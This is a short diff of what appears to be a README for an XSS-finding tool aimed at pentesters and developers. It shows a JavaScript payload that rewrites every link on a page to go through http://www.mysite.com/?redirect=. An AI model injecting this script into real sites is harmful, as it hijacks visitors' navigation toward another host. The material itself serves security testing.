@@ -4,5 +4,5 @@ This tool helps the pentester or developer for finding the xss bug.
 
 js payload for redirecting :
 var anchors = document.getElementsByTagName("a");for (var i = 0; i < anchors.length; i++) {
-    anchors[i].href = "http://www.mysite.com/?redirect=" + anchors[i].href
+    anchors[i].href = "http://www.mysite.com/?redirect=" 
 }
